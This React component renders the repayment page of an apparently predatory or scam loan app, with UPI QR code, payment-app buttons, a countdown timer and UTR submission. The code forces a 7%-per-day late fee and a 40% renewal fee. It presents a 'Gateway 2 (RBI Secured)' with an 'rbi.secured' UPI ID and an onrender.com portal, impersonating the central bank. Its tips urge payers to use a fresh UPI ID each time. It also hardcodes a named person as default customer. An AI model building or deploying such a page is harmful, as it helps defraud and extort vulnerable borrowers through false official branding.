import React, { useState, useEffect } from 'react';
import { LoanOrder, num } from '../utils/loan';
import { ICONS } from './Icons';
import { AdminConfig } from './AdminPanel';

interface RepaymentFlowProps {
  order: LoanOrder;
  adminConfig?: AdminConfig;
  onBack: () => void;
  onPaymentSuccess: (order: LoanOrder, amountPaid: number, utr: string) => void;
}

export const RepaymentFlow: React.FC<RepaymentFlowProps> = ({
  order,
  adminConfig,
  onBack,
  onPaymentSuccess,
}) => {
  // Parsing dates
  const initialAppDate = (order.ad || order.d || '23/10/2026').replace(/\//g, '-');
  const [receivedDate] = useState<string>(initialAppDate);
  const [selectedGateway, setSelectedGateway] = useState<'gw1' | 'gw2'>(
    adminConfig?.activeGateway === 'gateway2' ? 'gw2' : 'gw1'
  );
  const [paymentType, setPaymentType] = useState<'full' | 'renew'>('full');

  // Gateway credentials
  const gw1Upi = adminConfig?.upiId || 'paytm.s3u8921@pty';
  const gw2Upi = adminConfig?.gateway2UpiId || 'rbi.secured@hdfcbank';
  const activeUpi = selectedGateway === 'gw1' ? gw1Upi : gw2Upi;
  const gw2Url = adminConfig?.gateway2Url || 'https://payment-portal-rbisecured.onrender.com';
  const customerName = adminConfig?.customerName || 'BHAVIK KAMLESH SANGHVI';

  const [copiedUpi, setCopiedUpi] = useState(false);
  const [utrInput, setUtrInput] = useState('');
  const [utrError, setUtrError] = useState('');
  const [showUtrSuccessModal, setShowUtrSuccessModal] = useState(false);
  const [submittedUtr, setSubmittedUtr] = useState('');
  const [showCancelModal, setShowCancelModal] = useState(false);
  const [timerSeconds, setTimerSeconds] = useState((adminConfig?.linkTimeMinutes || 10) * 60 - 12);
  const [isHindi, setIsHindi] = useState(false);

  // Dynamic calculations based strictly on THIS specific clicked order
  const principal = num(order.amt) || 11000;

  const calculateDynamicDates = (recDateStr: string) => {
    try {
      const parts = recDateStr.replace(/\//g, '-').split('-');
      const recDate = new Date(Number(parts[2]), Number(parts[1]) - 1, Number(parts[0]));
      const dueDate = new Date(recDate);
      dueDate.setDate(dueDate.getDate() + 7);

      const dueDay = String(dueDate.getDate()).padStart(2, '0');
      const dueMonth = String(dueDate.getMonth() + 1).padStart(2, '0');
      const dueDateFormatted = `${dueDay}-${dueMonth}-${dueDate.getFullYear()}`;

      const now = new Date();
      const todayZero = new Date(now.getFullYear(), now.getMonth(), now.getDate());
      const dueDateZero = new Date(dueDate.getFullYear(), dueDate.getMonth(), dueDate.getDate());
      const diffTime = todayZero.getTime() - dueDateZero.getTime();
      const diffDays = Math.max(0, Math.floor(diffTime / (1000 * 60 * 60 * 24)));

      const overdueDays = diffDays || 2;
      const lateFee = Math.round(principal * 0.07 * overdueDays);
      const totalRemaining = principal + lateFee;
      const renewalFee = Math.round(principal * 0.40);
      const renewAmount = renewalFee + lateFee;

      return {
        dueDateFormatted,
        overdueDays,
        lateFee,
        totalRemaining,
        renewalFee,
        renewAmount,
      };
    } catch {
      return {
        dueDateFormatted: order.d || '02-11-2026',
        overdueDays: 2,
        lateFee: Math.round(principal * 0.14),
        totalRemaining: Math.round(principal * 1.14),
        renewalFee: Math.round(principal * 0.40),
        renewAmount: Math.round(principal * 0.54),
      };
    }
  };

  const currentCalc = calculateDynamicDates(receivedDate);
  const payableAmount = paymentType === 'full' ? currentCalc.totalRemaining : currentCalc.renewAmount;

  // Countdown timer for Gateway (exact same style as screenshot)
  useEffect(() => {
    const interval = setInterval(() => {
      setTimerSeconds((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const formatTimer = (sec: number) => {
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return `${m} : ${s < 10 ? '0' : ''}${s}`;
  };

  const handleCopyUpi = () => {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(activeUpi);
    }
    setCopiedUpi(true);
    setTimeout(() => setCopiedUpi(false), 2200);
  };

  const upiPayUrl = `upi://pay?pa=${activeUpi}&pn=${encodeURIComponent(order.n)}&am=${payableAmount}&cu=INR&tn=${encodeURIComponent(order.no)}`;

  const handlePaytmClick = () => {
    handleCopyUpi();
    window.location.href = upiPayUrl;
  };

  const handlePhonePeClick = () => {
    handleCopyUpi();
    window.location.href = upiPayUrl;
  };

  const handleUtrSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const clean = utrInput.trim();
    if (!clean || clean.length !== 12 || !/^\d{12}$/.test(clean)) {
      setUtrError('Please enter a valid 12-digit numeric UTR.');
      return;
    }
    setUtrError('');
    setSubmittedUtr(clean);
    setShowUtrSuccessModal(true);
  };

  const handleConfirmSuccessModal = () => {
    setShowUtrSuccessModal(false);
    onPaymentSuccess(order, payableAmount, submittedUtr);
  };

  // Dynamic QR Code matching exact clicked order and amount
  const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(upiPayUrl)}`;

  return (
    <div
      className="w-full max-w-[420px] mx-auto min-h-screen flex flex-col relative select-none pb-24 text-neutral-900"
      style={{
        background: '#f0eff5',
        fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif",
      }}
    >
      {/* Toast Notification */}
      <div
        className={`fixed top-6 left-1/2 -translate-x-1/2 z-50 transition-all duration-300 bg-[#1e2530] text-white text-[13px] px-4 py-2.5 rounded-full shadow-2xl font-bold flex items-center space-x-2 ${
          copiedUpi ? 'opacity-100 scale-100' : 'opacity-0 scale-95 pointer-events-none'
        }`}
      >
        <span>📋</span>
        <span>UPI ID Copied! Pay from any UPI app.</span>
      </div>

      {/* ── TOP BAR (Exact Screenshot: Pure white bar, bold < left arrow, centered bold "Repay") ── */}
      <div
        style={{
          background: '#ffffff',
          padding: '13px 18px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          position: 'sticky',
          top: 0,
          zIndex: 20,
          borderBottom: '1.5px solid #f0f0f0',
        }}
      >
        <button
          type="button"
          onClick={() => setShowCancelModal(true)}
          style={{ background: 'none', border: 'none', cursor: 'pointer', padding: '4px 2px', lineHeight: 1 }}
          aria-label="Back"
        >
          <svg width="24" height="24" fill="none" stroke="#111" strokeWidth="2.5" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
          </svg>
        </button>
        <h1
          style={{
            fontFamily: "Georgia, 'Times New Roman', serif",
            fontSize: '20px',
            fontWeight: 800,
            color: '#0d0d0d',
            margin: 0,
            letterSpacing: '0.2px',
          }}
        >
          Repay
        </h1>
        <div style={{ width: '28px' }} />
      </div>

      {/* ── PURPLE TIMER BAR (Exact Screenshot: Deep purple #6a1aad, clock icon, timer, हिन्दी pill) ── */}
      <div
        style={{
          background: '#6a1aad',
          padding: '10px 18px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', gap: '9px' }}>
          <svg width="19" height="19" fill="none" stroke="#e2b8ff" strokeWidth="2" viewBox="0 0 24 24">
            <circle cx="12" cy="12" r="10" />
            <path strokeLinecap="round" strokeLinejoin="round" d="M12 6v6l3.5 2" />
          </svg>
          <span
            style={{
              color: '#ffffff',
              fontSize: '17px',
              fontWeight: 700,
              fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
              letterSpacing: '3px',
            }}
          >
            {formatTimer(timerSeconds)}
          </span>
        </div>
        <button
          type="button"
          onClick={() => setIsHindi(!isHindi)}
          style={{
            background: 'transparent',
            border: '1.8px solid #d4aaff',
            color: '#e8d5ff',
            borderRadius: '999px',
            padding: '3px 14px',
            fontSize: '13px',
            fontWeight: 600,
            cursor: 'pointer',
            letterSpacing: '0.3px',
          }}
        >
          {isHindi ? 'English' : 'हिंदी'}
        </button>
      </div>

      {/* ── BIG AMOUNT (Exact Screenshot: Centered bold purple amount, white background) ── */}
      <div style={{ background: '#ffffff', textAlign: 'center', padding: '18px 16px 16px' }}>
        <h2
          style={{
            fontFamily: "Georgia, 'Times New Roman', serif",
            fontSize: '36px',
            fontWeight: 800,
            color: '#6a1aad',
            margin: 0,
            letterSpacing: '-0.5px',
          }}
        >
          ₹ {Number(payableAmount).toFixed(2)}
        </h2>

        {/* Selected Product Banner (Shows ONLY the exact clicked product) */}
        <div className="mt-2.5 inline-flex items-center gap-2 px-3 py-1 bg-[#f7f5fc] rounded-full border border-[#e4ddf5]">
          <div className="w-5 h-5 rounded-md bg-[#6a1aad] text-white flex items-center justify-center text-[10px] font-bold overflow-hidden">
            {ICONS[order.ic] || order.n.slice(0, 2).toUpperCase()}
          </div>
          <span
            className="text-[13px] font-bold text-[#2d1854]"
            style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
          >
            {order.n}
          </span>
          <span className="text-[11px] text-gray-500 font-mono">({order.no})</span>
        </div>

        {/* Repayment Option Toggle: Full Repay vs 7-Day Renew */}
        <div className="mt-3.5 flex justify-center gap-2">
          <button
            type="button"
            onClick={() => setPaymentType('full')}
            className={`px-4 py-1.5 rounded-full text-xs font-bold transition-all cursor-pointer ${
              paymentType === 'full'
                ? 'bg-[#6a1aad] text-white shadow-sm'
                : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
            }`}
          >
            Full Repay (₹{currentCalc.totalRemaining})
          </button>
          <button
            type="button"
            onClick={() => setPaymentType('renew')}
            className={`px-4 py-1.5 rounded-full text-xs font-bold transition-all cursor-pointer ${
              paymentType === 'renew'
                ? 'bg-[#6a1aad] text-white shadow-sm'
                : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
            }`}
          >
            7-Day Renew (₹{currentCalc.renewAmount})
          </button>
        </div>
      </div>

      {/* ── 2ND PAYMENT GATEWAY SELECTOR (Direct Gateway 1 & Gateway 2 Support) ── */}
      <div className="px-3 pt-3">
        <div className="bg-white rounded-xl p-2.5 border border-purple-100 shadow-2xs flex items-center justify-between">
          <span className="text-xs font-bold text-gray-700 pl-1">Payment Gateway:</span>
          <div className="flex gap-1.5">
            <button
              type="button"
              onClick={() => setSelectedGateway('gw1')}
              className={`px-3 py-1 rounded-lg text-xs font-bold cursor-pointer transition-all ${
                selectedGateway === 'gw1'
                  ? 'bg-[#5b21b6] text-white shadow-xs'
                  : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
              }`}
            >
              Gateway 1 (UPI)
            </button>
            <button
              type="button"
              onClick={() => setSelectedGateway('gw2')}
              className={`px-3 py-1 rounded-lg text-xs font-bold cursor-pointer transition-all ${
                selectedGateway === 'gw2'
                  ? 'bg-[#5b21b6] text-white shadow-xs'
                  : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
              }`}
            >
              Gateway 2 (RBI Secured)
            </button>
          </div>
        </div>

        {/* External Link Option to open Render portal directly */}
        {selectedGateway === 'gw2' && (
          <div className="mt-1.5 px-1 flex items-center justify-between text-[11px] text-purple-700 bg-purple-50 p-2 rounded-lg border border-purple-200">
            <span>Open in RBI Secured Render Portal:</span>
            <a
              href={`${gw2Url}/admin`}
              target="_blank"
              rel="noreferrer"
              className="font-bold underline hover:text-purple-900"
            >
              Open Portal ↗
            </a>
          </div>
        )}
      </div>

      {/* ── CARDS SCROLL AREA ── */}
      <div style={{ padding: '12px 11px 20px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
        {/* ── CARD 1: Scan QR Code to Pay (Screenshot 2) ── */}
        <div
          style={{
            background: '#ffffff',
            borderRadius: '18px',
            overflow: 'hidden',
            boxShadow: '0 1px 8px rgba(80,0,160,0.09)',
            border: '1px solid #e5dff5',
          }}
        >
          {/* Lavender header row */}
          <div
            style={{
              background: '#eeeaf8',
              padding: '13px 16px',
              display: 'flex',
              alignItems: 'center',
              gap: '10px',
            }}
          >
            <svg width="21" height="21" fill="none" stroke="#5b21b6" strokeWidth="2.2" viewBox="0 0 24 24">
              <path strokeLinecap="square" d="M4 9V5h4" />
              <path strokeLinecap="square" d="M4 15v4h4" />
              <path strokeLinecap="square" d="M20 9V5h-4" />
              <path strokeLinecap="square" d="M20 15v4h-4" />
            </svg>
            <span
              style={{
                fontFamily: "Georgia, 'Times New Roman', serif",
                fontSize: '16px',
                fontWeight: 700,
                color: '#2d1854',
              }}
            >
              Scan QR Code to Pay
            </span>
          </div>

          {/* QR body: light lavender/white bg, centered QR code */}
          <div style={{ padding: '20px 16px 22px', display: 'flex', justifyContent: 'center', background: '#f8f7fc' }}>
            <img
              src={qrCodeUrl}
              alt="UPI QR Code"
              style={{ width: '200px', height: '200px', objectFit: 'contain', display: 'block', borderRadius: '10px' }}
            />
          </div>
        </div>

        {/* ── CARD 2: Pay via UPI App (Screenshot 3) ── */}
        <div
          style={{
            background: '#ffffff',
            borderRadius: '18px',
            overflow: 'hidden',
            boxShadow: '0 1px 8px rgba(80,0,160,0.09)',
            border: '1px solid #e5dff5',
          }}
        >
          {/* Lavender header row */}
          <div
            style={{
              background: '#eeeaf8',
              padding: '13px 16px',
              display: 'flex',
              alignItems: 'center',
              gap: '10px',
            }}
          >
            <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
              <rect x="2" y="2" width="7" height="7" rx="1.5" fill="#5b21b6" />
              <rect x="11" y="2" width="7" height="7" rx="1.5" fill="#5b21b6" />
              <rect x="2" y="11" width="7" height="7" rx="1.5" fill="#5b21b6" />
              <rect x="11" y="11" width="7" height="7" rx="1.5" fill="#5b21b6" />
            </svg>
            <span
              style={{
                fontFamily: "Georgia, 'Times New Roman', serif",
                fontSize: '16px',
                fontWeight: 700,
                color: '#2d1854',
              }}
            >
              Pay via UPI App
            </span>
          </div>

          {/* Two-column app buttons */}
          <div
            style={{
              padding: '14px 13px 16px',
              display: 'grid',
              gridTemplateColumns: '1fr 1fr',
              gap: '11px',
              background: '#ffffff',
            }}
          >
            {/* PAYTM BUTTON */}
            <button
              type="button"
              onClick={handlePaytmClick}
              style={{
                border: '1.5px solid #d1cfe8',
                borderRadius: '14px',
                background: '#ffffff',
                padding: '14px 10px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '9px',
                cursor: 'pointer',
                boxShadow: '0 1px 4px rgba(0,0,0,0.07)',
              }}
            >
              <svg width="58" height="24" viewBox="0 0 116 38" xmlns="http://www.w3.org/2000/svg" style={{ flexShrink: 0 }}>
                <text
                  x="2"
                  y="29"
                  fontFamily="'Trebuchet MS','Arial Rounded MT Bold',Arial,sans-serif"
                  fontSize="28"
                  fontWeight="800"
                  fill="#002970"
                  letterSpacing="-0.5"
                >
                  pay
                </text>
                <text
                  x="64"
                  y="29"
                  fontFamily="'Trebuchet MS','Arial Rounded MT Bold',Arial,sans-serif"
                  fontSize="28"
                  fontWeight="800"
                  fill="#00baf2"
                  letterSpacing="-0.5"
                >
                  tm
                </text>
              </svg>
              <span
                style={{
                  fontSize: '15px',
                  fontWeight: 700,
                  color: '#0d0d0d',
                  letterSpacing: '0.1px',
                }}
              >
                Paytm
              </span>
            </button>

            {/* PHONEPE BUTTON */}
            <button
              type="button"
              onClick={handlePhonePeClick}
              style={{
                border: '1.5px solid #d1cfe8',
                borderRadius: '14px',
                background: '#ffffff',
                padding: '14px 10px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '9px',
                cursor: 'pointer',
                boxShadow: '0 1px 4px rgba(0,0,0,0.07)',
              }}
            >
              <svg width="32" height="32" viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg" style={{ flexShrink: 0 }}>
                <circle cx="22" cy="22" r="21" fill="#5f259f" />
                <g fill="white">
                  <rect x="13" y="10" width="5" height="24" rx="2.5" />
                  <path d="M18 10 h4 a8 8 0 0 1 0 14 h-4 z" />
                  <path d="M26 20 q8 2 6 14 q-1 4-5 4 q3-8-1-13 z" />
                </g>
              </svg>
              <span
                style={{
                  fontSize: '15px',
                  fontWeight: 700,
                  color: '#0d0d0d',
                  letterSpacing: '0.1px',
                }}
              >
                PhonePe
              </span>
            </button>
          </div>
        </div>

        {/* ── CARD 3: Manual Transfer (🔥 Recommended) ── */}
        <div
          style={{
            background: '#ffffff',
            borderRadius: '18px',
            overflow: 'hidden',
            boxShadow: '0 1px 8px rgba(80,0,160,0.09)',
            border: '1px solid #e5dff5',
          }}
        >
          {/* Lavender header row */}
          <div
            style={{
              background: '#eeeaf8',
              padding: '13px 16px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '9px' }}>
              <svg width="18" height="18" fill="none" stroke="#5b21b6" strokeWidth="2.2" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z" />
              </svg>
              <span
                style={{
                  fontFamily: "Georgia, 'Times New Roman', serif",
                  fontSize: '16px',
                  fontWeight: 700,
                  color: '#2d1854',
                }}
              >
                Manual Transfer
              </span>
            </div>
            <span
              style={{
                background: '#f05252',
                color: '#ffffff',
                borderRadius: '999px',
                padding: '4px 12px',
                fontSize: '12px',
                fontWeight: 800,
                display: 'inline-flex',
                alignItems: 'center',
                gap: '5px',
                whiteSpace: 'nowrap',
              }}
            >
              <span>🔥</span> Recommended
            </span>
          </div>

          {/* White body */}
          <div style={{ padding: '16px 16px 18px', background: '#ffffff' }}>
            <p
              style={{
                fontFamily: "Georgia, 'Times New Roman', serif",
                fontSize: '14px',
                fontWeight: 800,
                color: '#111111',
                margin: '0 0 10px',
                letterSpacing: '0.2px',
              }}
            >
              UPI ID
            </p>

            {/* UPI row: light gray bg, monospace UPI text, purple COPY button */}
            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                border: '1.5px solid #ddd8ec',
                borderRadius: '12px',
                overflow: 'hidden',
                background: '#f7f6fc',
              }}
            >
              <span
                style={{
                  fontFamily: "'Courier New', Courier, monospace",
                  fontSize: '14.5px',
                  fontWeight: 600,
                  color: '#1a1a2e',
                  flex: 1,
                  padding: '11px 14px',
                  overflow: 'hidden',
                  textOverflow: 'ellipsis',
                  whiteSpace: 'nowrap',
                }}
              >
                {activeUpi}
              </span>
              <button
                type="button"
                onClick={handleCopyUpi}
                style={{
                  background: '#5b21b6',
                  color: '#ffffff',
                  border: 'none',
                  borderRadius: '0 10px 10px 0',
                  padding: '11px 18px',
                  fontSize: '13px',
                  fontWeight: 800,
                  cursor: 'pointer',
                  whiteSpace: 'nowrap',
                  letterSpacing: '0.5px',
                }}
              >
                {copiedUpi ? 'COPIED!' : 'COPY'}
              </button>
            </div>

            <p
              style={{
                fontFamily: "Georgia, 'Times New Roman', serif",
                fontSize: '13px',
                color: '#c2710c',
                fontWeight: 600,
                margin: '9px 0 0',
              }}
            >
              Get new UPI every time, do not save.
            </p>
          </div>
        </div>

        {/* ── CARD 4: 12-digit UTR (Screenshot 5) ── */}
        <div
          style={{
            background: '#ffffff',
            borderRadius: '18px',
            padding: '16px',
            boxShadow: '0 1px 8px rgba(80,0,160,0.09)',
            border: '1px solid #e5dff5',
          }}
        >
          <h3
            style={{
              fontFamily: "Georgia, 'Times New Roman', serif",
              fontSize: '16px',
              fontWeight: 800,
              color: '#111111',
              margin: '0 0 13px',
            }}
          >
            12-digit UTR
          </h3>

          <form onSubmit={handleUtrSubmit}>
            <div
              style={{
                border: '1.5px solid #ddd8ec',
                borderRadius: '12px',
                padding: 0,
                background: '#ffffff',
                overflow: 'hidden',
              }}
            >
              <div style={{ display: 'flex', alignItems: 'center', padding: '12px 14px' }}>
                <span style={{ color: '#e53e3e', fontWeight: 800, marginRight: '5px', fontSize: '16px' }}>*</span>
                <span
                  style={{
                    fontFamily: "Georgia, 'Times New Roman', serif",
                    fontSize: '14px',
                    fontWeight: 700,
                    color: '#111',
                    marginRight: '8px',
                  }}
                >
                  UTR
                </span>
                <input
                  type="text"
                  maxLength={12}
                  inputMode="numeric"
                  value={utrInput}
                  onChange={(e) => {
                    const clean = e.target.value.replace(/\D/g, '');
                    setUtrInput(clean);
                    if (clean.length > 0 && clean.length < 12) {
                      setUtrError('Please enter 12-digit numeric UTR');
                    } else {
                      setUtrError('');
                    }
                  }}
                  placeholder="Input 12-digit Here"
                  style={{
                    flex: 1,
                    border: 'none',
                    outline: 'none',
                    fontSize: '14px',
                    fontWeight: 600,
                    color: '#111',
                    fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
                  }}
                />
              </div>
            </div>

            {utrError && (
              <p className="text-red-500 text-xs font-semibold mt-1.5 pl-1">{utrError}</p>
            )}

            <button
              type="submit"
              disabled={utrInput.length !== 12}
              style={{
                width: '100%',
                marginTop: '14px',
                padding: '13px',
                borderRadius: '999px',
                background: utrInput.length === 12 ? '#5b21b6' : '#a89bc2',
                color: '#ffffff',
                fontSize: '16px',
                fontWeight: 800,
                border: 'none',
                cursor: utrInput.length === 12 ? 'pointer' : 'not-allowed',
                boxShadow: '0 2px 6px rgba(91,33,182,0.3)',
                letterSpacing: '0.3px',
              }}
            >
              Submit UTR
            </button>
          </form>
        </div>

        {/* ── CARD 5: Exact Tips Section (Matches Screenshots) ── */}
        <section
          style={{
            fontFamily: "Georgia, 'Times New Roman', serif",
            fontSize: '15px',
            lineHeight: 1.45,
            padding: '4px 6px',
          }}
        >
          <h3 style={{ fontWeight: 700, color: '#111', fontSize: '16px', marginBottom: '8px' }}>Tips:</h3>
          <div className="space-y-2.5 text-[14px]">
            <p>
              <strong style={{ color: '#ea1515', fontWeight: 800 }}>! ! ! One UPI</strong>{' '}
              <span>can only transfer money</span> <strong style={{ color: '#ea1515', fontWeight: 800 }}>ONCE.</strong>
            </p>
            <p>
              <strong style={{ color: '#ea1515', fontWeight: 800 }}>! ! ! DO NOT CHANGE</strong>{' '}
              <span>the payment</span> <strong style={{ color: '#ea1515', fontWeight: 800 }}>AMOUNT & UPI.</strong>
            </p>
            <p>
              <strong style={{ color: '#ea1515', fontWeight: 800 }}>! ! ! DO NOT</strong>{' '}
              <span>transfer money in the</span> <strong style={{ color: '#ea1515', fontWeight: 800 }}>UPI</strong>{' '}
              <span>friend</span> <strong style={{ color: '#ea1515', fontWeight: 800 }}>CHAT</strong>{' '}
              <span>window again.</span>
            </p>
            <p>
              <span>Otherwise, the order</span>{' '}
              <strong style={{ color: '#ea1515', fontWeight: 800 }}>CANNOT be completed.</strong>
            </p>
            <p>
              <span>After payment is completed, please</span>{' '}
              <strong style={{ color: '#ea1515', fontWeight: 800 }}>fill in the UTR.</strong>
            </p>
          </div>
        </section>
      </div>

      {/* ── MODAL: UTR Submitted Success Modal ── */}
      {showUtrSuccessModal && (
        <div className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center p-4">
          <div className="bg-white rounded-3xl max-w-sm w-full p-6 text-center shadow-2xl space-y-4">
            <div className="w-16 h-16 mx-auto bg-green-100 rounded-full flex items-center justify-center text-green-600 text-3xl font-bold">
              ✓
            </div>
            <h3
              className="text-xl font-bold text-gray-900"
              style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
            >
              Payment Submitted!
            </h3>
            <p className="text-sm text-gray-600">
              Your 12-digit UTR{' '}
              <span className="font-bold text-gray-900 font-mono bg-gray-100 px-2 py-0.5 rounded">
                {submittedUtr}
              </span>{' '}
              has been received and is under verification.
            </p>
            <button
              type="button"
              onClick={handleConfirmSuccessModal}
              className="w-full py-3 bg-[#54158c] text-white font-bold rounded-full shadow cursor-pointer hover:bg-[#441170]"
            >
              Done
            </button>
          </div>
        </div>
      )}

      {/* ── MODAL: Cancel Payment Confirmation ── */}
      {showCancelModal && (
        <div className="fixed inset-0 z-50 bg-black/50 flex items-center justify-center p-4">
          <div className="bg-white rounded-2xl max-w-xs w-full p-5 text-center shadow-2xl space-y-3">
            <h4 className="font-bold text-gray-900 text-base">Cancel Repayment?</h4>
            <p className="text-xs text-gray-500">
              Are you sure you want to exit? Your payment will not be completed.
            </p>
            <div className="flex gap-2 pt-2">
              <button
                type="button"
                onClick={() => setShowCancelModal(false)}
                className="flex-1 py-2 rounded-xl border border-gray-300 text-xs font-bold text-gray-700 cursor-pointer"
              >
                Stay Here
              </button>
              <button
                type="button"
                onClick={() => {
                  setShowCancelModal(false);
                  onBack();
                }}
                className="flex-1 py-2 rounded-xl bg-red-600 text-white text-xs font-bold cursor-pointer hover:bg-red-700"
              >
                Yes, Exit
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
